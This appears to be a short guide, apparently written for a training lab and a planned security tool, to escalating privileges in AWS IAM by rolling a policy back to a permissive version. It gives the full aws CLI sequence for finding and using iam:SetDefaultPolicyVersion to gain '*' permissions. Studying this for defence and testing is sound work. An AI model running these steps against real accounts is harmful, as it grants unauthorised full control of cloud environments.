# Privilege Escalation Scenarios

This document is meant to serve as a guide to a few techniques that will be latter implemented in the Tool.

## IAM_PRIV_ESC_BY_ROLLBACK

- list user policies
    ```
    aws iam list-attached-user-policies --user-name raynor-iam_privesc_by_rollback_cgidiquto2hmot
    ```
- Get the policy data
    ```
    aws iam get-policy --policy-arn arn:aws:iam::601904299386:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidiquto2hmot
    ```
- Get the policy content
    ```
    aws iam get-policy-version --policy-arn arn:aws:iam::601904299386:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidiquto2hmot --version-id v1
    ```
When we check this policy version, we can see that we have the **iam:SetDefaultPolicyVersion** permission. With this permission, we can update the policy version to another version, which can have differente permissions.
We then check another version of the policy to see if we can use this somehow.

- Check policy for another version:
    ```
    aws iam get-policy-version --policy-arn arn:aws:iam::601904299386:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidiquto2hmot --version-id v2
    ```
We can see that the **v2** policy has the *\* permissions.

- Update policy:
    ```
    aws iam set-default-policy-version --policy-arn arn:aws:iam::601904299386:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidiquto2hmot --version-id v2
    ```

By doing this, we have achive full permissions on the environment.
